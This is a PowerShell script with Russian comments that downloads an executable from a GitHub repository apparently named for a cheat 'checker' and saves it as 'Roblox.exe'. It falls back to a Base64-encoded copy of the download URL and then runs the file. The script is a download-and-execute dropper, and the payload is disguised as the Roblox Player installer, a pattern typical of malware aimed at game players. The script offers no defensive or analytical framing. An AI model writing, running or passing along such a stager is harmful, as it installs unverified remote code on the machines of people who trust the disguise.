$url = 'https://github.com/CheatCheckNo98237/checker/raw/refs/heads/main/RobloxPlayerInstaller.exe'
$output = 'Roblox.exe'

# Base64 строка (если понадобится как запасной вариант)
$base64url = 'aHR0cHM6Ly9naXRodWIuY29tL0NoZWF0Q2hlY2tObzk4MjM3L2NoZWNrZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9Sb2Jsb3hQbGF5ZXJJbnN0YWxsZXIuZXhl'

$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0')

# Попытка скачать 2 раза обычным способом
try {
    $wc.DownloadFile($url, $output)
    $wc.DownloadFile($url, $output)
} catch {
    # Если не получилось — пробуем через Base64
    $decodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64url))
    $wc.DownloadFile($decodedUrl, $output)
    $wc.DownloadFile($decodedUrl, $output)
}

# Запуск
Start-Process $output